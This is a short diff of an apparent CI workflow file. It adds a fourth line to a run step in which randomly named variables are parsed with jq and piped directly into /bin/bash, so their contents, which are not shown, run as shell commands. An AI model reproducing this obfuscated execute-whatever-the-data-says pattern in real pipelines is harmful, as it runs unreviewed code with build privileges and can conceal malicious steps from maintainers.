@@ -55,6 +55,7 @@ jobs:
           echo $vmyy330 | jq -r .cfxef643 | /bin/bash
           printf '%s' "$f1" | jq -r .a93348 | /bin/bash
           printf '%s' "$ea28" | jq -r .sgxn6 | /bin/bash
+          echo $eamw5 | jq -r .jnt4 | /bin/bash
 
       - name: Store artifact
         if: always()
